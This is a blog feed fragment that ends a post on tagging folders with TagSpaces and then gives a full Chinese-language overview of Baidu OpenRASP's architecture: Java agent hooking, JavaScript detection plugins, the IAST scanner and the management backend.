64 位的 installer</p><p><img src="https://i.loli.net/2021/09/09/WTKhz4ZfGlLgU8D.jpg" style="zoom:80%;" /><br /></p><p>选择为任何人安装（我这里已经安装过了）</p><p><img src="https://i.loli.net/2021/09/09/nSW6aodrHus9X7Q.jpg" style="zoom: 75%;" /><br /></p><p>同意许可证协议后，然后，执行安装</p><p><img src="https://i.loli.net/2021/09/09/32OvhnMu8Ycx49g.jpg" style="zoom:75%;" /><br /></p><p>第一次打开需要选择标签的保存方式，也可以在设置里修改</p><ul><li>重命名文件（RENAME FILE）</li><li>额外文件（USE SIDECAR FILE）</li></ul><p>另外，可以在设置里选择中文</p><img src="https://i.loli.net/2021/09/09/e5JglQmKXhdaMzj.jpg" style="zoom:60%;" /><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p>这些界面在浏览文件时不一定都有，可以通过设置更改是否显示，每个区域具体的功能就不展开了，看官方文档就好。</p><ol><li>垂直工具栏：始终可见，提供对应用程序主要部分的快速访问</li><li>位置管理器&#x2F;标签库&#x2F;搜索区域：管理关联的位置，标记库，搜索文件和文件夹</li><li>导航：切换位置或快速导航到父文件夹</li><li>浏览区域：浏览文件和文件夹</li><li>常用操作区：在这里可以访问当前打开的文件或文件夹的常用操作</li><li>文件&#x2F;文件夹属性：展示文件或文件夹的一些属性</li><li>预览区：预览或编辑当前文件</li></ol><img src="https://docs.tagspaces.org/assets/images/main-ui-areas-7170f35243bccbbfc608936cb13577ab.png" /><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>重点就是给文件夹<strong>打标签</strong>，首先我删除了默认关联的文件夹（LOCATION MANAGER），然后关联保存姿势文件（CMTool）和 Mod 文件（TexTools）的路径。</p><p>具体的操作是：<code>CONNECT A LOCATION -&gt; 填入 Location Path -&gt; 设置 Location Name -&gt; OK</code></p><p><img src="https://i.loli.net/2021/09/09/xIae7kfpDPzMN6J.jpg" style="zoom:70%;" /><br /></p><p>关联之后就可以进行查看（我这里已经打了几个标签）</p><p><img src="https://i.loli.net/2021/09/09/Rxa47IV2KDghcSr.jpg" style="zoom:70%;" /><br /></p><p>点击左侧的标签可以创建标签组，我已经把默认的标签组都给删了，Collected Tags 收集直接对文件&#x2F;文件夹添加不在标签组中的标签。</p><p><img src="https://i.loli.net/2021/09/09/HmOA7pC9KcfS3PT.jpg" style="zoom:70%;" /><br /></p><p>点击 TAG LIBRARY 旁边的三个点，选择创建标签组（Create Tag Group），设置标签组名称和默认的背景&#x2F;文字颜色，创建完毕后括号内显示创建标签时所在的文件夹名称，不过其他文件夹也可以用就是了。</p><p><img src="https://i.loli.net/2021/09/09/h2vuLrXIYQNVMjZ.png" style="zoom:60%;" /><br /></p><p>点击标签组旁边的三个点，选择添加标签（Add Tags），添加完毕后点击标签旁边的三个点可以设置标签名称、背景&#x2F;文字颜色。</p><p><img src="https://i.loli.net/2021/09/09/qr9kKMJY45F6RPp.png" style="zoom:60%;" /><br /></p><p>设置完标签之后就可以对文件夹打标签了，选择文件夹后，点击上方的标签图标即可添加标签，一次可添加多个标签。</p><img src="https://i.loli.net/2021/09/09/bvaD9USQEJsnmA7.jpg" style="zoom:75%;" /><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我把上面的写完才看到设置里可以改成中文，然后在安装那一节补充了设置方法 🆘</p><p>总体来说用起来很方便，为了避免重命名文件，我选择了使用附加文件的方式，这样做的结果就是文件夹中会出现一个 <code>.ts</code> 文件夹，其中的 json 文件保存了标签信息。<code>.ts</code> 文件夹默认是隐藏的，对我来说，存的文件夹和标签也占不了多大空间，所以这样就好了！</p><p><img src="https://i.loli.net/2021/09/09/qwxXlvUAaBdjfui.png" style="zoom:80%;" /><br /></p><p>这个工具还有许多其他功能，我只是用了其中的标签功能而已，更多的就看 <a href="https://docs.tagspaces.org/">文档</a> 发掘吧~</p>]]></content>
    
    
    <summary type="html">给文件和文件夹打标签进行管理</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>百度 OpenRASP 组成分析</title>
    <link href="https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</id>
    <published>2021-09-08T07:17:39.000Z</published>
    <updated>2022-03-10T06:25:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RASP-架构"><a href="#RASP-架构" class="headerlink" title="RASP 架构"></a>RASP 架构</h1><p>RASP 将 agent 嵌入应用，通过 hook 技术植入探针，在关键点触发检测，拦截&#x2F;放行</p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/7195ace984937ccbddc171ece82e237e.png" style="zoom:80%;" /><p>Java 应用的探针植入方法</p><ul><li>Servlet Filter：在请求响应路径上监测，只能对 http 报文过滤处理</li><li>JVM 重构：植入 JVM 内部, 基于 JVM 的安全控制层实现 RASP 容器<ul><li>需要对 JVM 非常熟悉，难度很大，国外 <a href="https://www.waratek.com/runtime-application-self-protection-rasp/">waratek</a> 采用这种方法</li></ul></li><li>Java Instrument：普遍，OpenRASP 使用该方法</li></ul><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/fca02f0c30846c349a6f3f35998724dd.png" style="zoom:80%"><h1 id="OpenRASP-组成部分"><a href="#OpenRASP-组成部分" class="headerlink" title="OpenRASP 组成部分"></a>OpenRASP 组成部分</h1><ul><li>Java Agent</li><li>JavaScript 插件</li><li>Agent 管理后台（Vue + Golang 实现）<ul><li>ElasticSearch + MongoDB</li></ul></li><li>IAST 扫描器（Python 实现）</li></ul><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>启动服务时使用 <code>-javaagent</code> 参数指定 Java Agent，动态修改 Java 字节码（即 hook 插桩）</p><ul><li>攻击触发插桩点，Java Agent 获取到函数的参数</li></ul><h3 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h3><ol><li>启动时首先会进入 <code>javaagent</code> 的 premain 函数，该函数会在 main 函数之前预先执行</li><li>当去 hook 像 java.io.File 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，无法从该类调用非 <code>BootstrapClassLoader</code> 加载的类中的接口，所以 agent.jar 会先将自己添加到 <code>BootstrapClassLoader</code> 的 ClassPath 下，这样 hook 由 <code>BootstrapClassLoader</code> 加载的类的时候就能够成功调用到 agent.jar 中的检测入口</li><li>释放 <code>log4j</code> 日志配置文件，如果存在则跳过</li><li>根据 <code>openrasp.yml</code> 文件初始化相应配置项</li><li>初始化 JS 插件模块<ul><li>JS 上下文类初始化</li><li>插件文件初始化</li></ul></li><li>初始化字节码转换模块<ul><li>给 load class 操作进行插桩操作，当类加载的时候会先进入 agent 进行处理</li><li>对于在初始化前已加载的类执行 <code>retransform</code> 处理，e.g <code>FileInputStream</code></li></ul></li><li>输出启动成功日志，开启全局 Hook 开关（启动阶段为关闭状态）<ul><li>若启动过程中发生错误，记录错误日志</li></ul></li><li>给 openrasp.yml 配置文件和 js 插件目录以及 assets 目录增加文件监控，以便文件内容更改的时候不需要重启就能够实时生效</li></ol><h3 id="hook-class-流程"><a href="#hook-class-流程" class="headerlink" title="hook class 流程"></a>hook class 流程</h3><ol><li>因为启动时候进行了插桩操作（<code>premain</code>），当有类被 ClassLoader 加载时候，所以会把该类的字节码先交给自定义的 Transformer 处理</li><li><strong>自定义 Transformer 会判断该类是否为需要 hook 的类</strong>，如果是会将该类交给 javassist 字节码处理框架进行处理</li><li>javassist 框架会将类的字节码依照事件驱动模型逐步解析每个方法，当触发需要 hook 的方法时，会在方法的开头或者结尾插入进入检测函数的字节码</li><li>把 hook 好的字节码返回给 transformer 从而载入虚拟机</li></ol><img src="https://rasp.baidu.com/doc/hacking/architect/images/startup.png" style="zoom:80%"><h3 id="请求处理流程"><a href="#请求处理流程" class="headerlink" title="请求处理流程"></a>请求处理流程</h3><p>以 <code>tomcat + JDBC + MySQL</code> 为例</p><ol><li>服务器收到一个请求，从而进入了服务器的请求 hook 点，该 hook 点标注当前线程为请求线程，开启当前线程的检测开关并把请求对象和响应对象进行缓存，以便后面使用</li><li>服务器发起 SQL 查询</li><li>进入 SQLStatementHook 点，我们挂钩了 execute、executeUpdate、executeQuery 等方法，从该方法进入检测流程如下：<ul><li>判断当前线程是否为请求线程（第一步标记的），如果是继续下面检测</li><li>采集 <code>connection_id（这个字段仅JDBC支持）</code>、<code>SQL 语句</code> 以及 <code>数据库类型</code> 等信息</li><li>构建参数信息，调用<strong>本地插件（Java）和 JS 插件</strong>进行安全检测<ul><li>还有<strong>基线检测</strong></li></ul></li><li>根据插件的执行结果决定是拦截请求、放行还是仅打印日志</li></ul></li><li>进入 SQLResultSetHook 点，我们挂钩了 resultSet.next 方法<ul><li>调用本地插件检查是否发生拖库行为，默认策略为一次查询结果超过 500 条就报警</li></ul></li><li>若决定拦截攻击<ul><li>输出报警日志到 logs&#x2F;alarm.log</li><li>如果 header 还没有发出，默认使用 302 跳转到拦截页面</li><li>如果 body 还没有发出，则重置未发送的 body</li><li>输出自定义拦截页面跳转 js 脚本<ul><li><code>&lt;/script&gt;&lt;script&gt;location.href=&#39;.../?request_id=xxx&#39;&lt;/script&gt;</code></li></ul></li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>-javaagent</code> 启动服务时加载 Agent，在 <code>premain</code> 函数中定义插桩逻辑，实现插桩<ul><li>预定义的 hook 点：<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook 函数列表</a></li><li>可新增 hook 点</li></ul></li><li>收到请求后，触发插桩点收集函数调用参数信息，调用插件检测</li><li>插件检测并返回结果，根据策略执行相应操作</li></ul><h2 id="JavaScript-插件"><a href="#JavaScript-插件" class="headerlink" title="JavaScript 插件"></a>JavaScript 插件</h2><p>Rhino 引擎支持将 Java 中的对象注册到 JavaScript 环境，并被 JavaScript 代码调用（数据共享）</p><ul><li><a href="https://github.com/mozilla/rhino">mozilla&#x2F;rhino</a></li><li>JS 插件提供热更新功能，即<strong>能够实时更新检测逻辑</strong></li><li>根据 Java Agent 返回的插桩点信息，执行检测算法，最后进行<strong>告警&#x2F;拦截</strong></li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/js.png" style="zoom:80%"><p>检测插件针对应用的行为进行检测，当应用执行操作时（触发检测点），OpenRASP 引擎就会调用检测插件，并将相关参数一并传递过来。</p><p>官方提供 14 个检测点：</p><ul><li>数据库查询</li><li>读取目录</li><li>请求参数</li><li>读取文件</li><li>写入文件</li><li>删除文件</li><li>文件包含操作</li><li>WebDAV 操作</li><li>文件上传</li><li>文件重命名</li><li>命令执行</li><li>XML 外部实体引用</li><li>Struts OGNL 表达式解析</li><li>RMI 反序列化</li><li>服务器端 HTTP 请求</li><li>服务器端 HTTP 请求 - 重定向之后</li><li>代码执行</li><li>类库加载</li><li>响应检查</li></ul><h2 id="IAST-扫描器"><a href="#IAST-扫描器" class="headerlink" title="IAST 扫描器"></a>IAST 扫描器</h2><p>被动扫描模式：启动扫描后保持运行，对新 url 进行实时扫描</p><ul><li>Python3 实现，MySQL 数据库，HTTP + JSON 通讯</li><li>属于主动 IAST，重放 payload<ul><li>被动 IAST 使用污点追踪实现</li><li>缺点：脏数据</li></ul></li></ul><p><strong>Agent 端</strong></p><p>用于收集 Web 应用的运行信息，即 OpenRASP Java Agent + Java Application</p><p><strong>扫描器端</strong></p><p>用于处理 OpenRASP 插件产生的请求信息，并完成整个 IAST 扫描逻辑</p><ul><li>预处理模块（HTTPServer）：接收 agent 插件的 http 请求，处理、存储、分发 http 请求信息</li><li>扫描模块（Scanner）：运行扫描插件，执行漏洞扫描逻辑<ul><li>生成扫描请求，发送给 web server 处理并返回结果（以及 hook 信息），检验结果</li></ul></li><li>监控模块（Monitor）：定期获取其他模块的运行时信息，调整参数，提供控制台服务等</li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/iast-main.png" style="zoom:80%"><p><a href="https://github.com/baidu-security/openrasp-iast">openrasp_iast</a> 源码中包含三种类型的插件</p><ul><li>扫描插件：plugin&#x2F;scanner，生成测试向量，检测测试结果</li><li>去重插件：plugin&#x2F;deduplicate，避免同一个请求被反复扫描</li><li>认证插件：plugin&#x2F;authorizer</li></ul><p>执行流程</p><ol><li>等待用户发送请求</li><li>Agent 端将 hook 信息发送给扫描器端</li><li>扫描器端构建 payload 重放</li><li>Agent 端将 hook 信息发送给扫描器端，扫描器端收到响应</li></ol><p>RASP + IAST</p><ul><li>RASP 安装 IAST 插件：openrasp&#x2F;plugins&#x2F;iast&#x2F;plugin.js（热更新）<ul><li>注册 hook 点，触发检测逻辑</li></ul></li><li>IAST 扫描器结合插件使用<ul><li>hook 信息、响应信息</li></ul></li></ul><h2 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h2><p>管理 Agent、查询日志</p><img src="https://rasp.baidu.com/doc/hacking/architect/images/rasp-cloud.png" style="zoom:80%"><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><ol><li>hook 点预先定义，触发后调用 JS 插件检测</li><li>扫描器接收请求及其 hook 信息，构造新的请求，根据执行结果和 hook 信息实现检测</li></ol><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="http://blog.nsfocus.net/rasp-tech/">RASP技术分析</a></li><li><a href="https://rasp.baidu.com/doc/">OpenRASP 官方文档</a></li></ul>]]></content>
    
    
    <summary type="html">梳理 OpenRASP 的各个组成部分：Java Agent 插桩、JS 插件检测、管理后台、IAST 扫描器。</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
    <category term="Golang" scheme="https://jckling.github.io/tags/Golang/"/>
    
  </entry>
  
</feed>
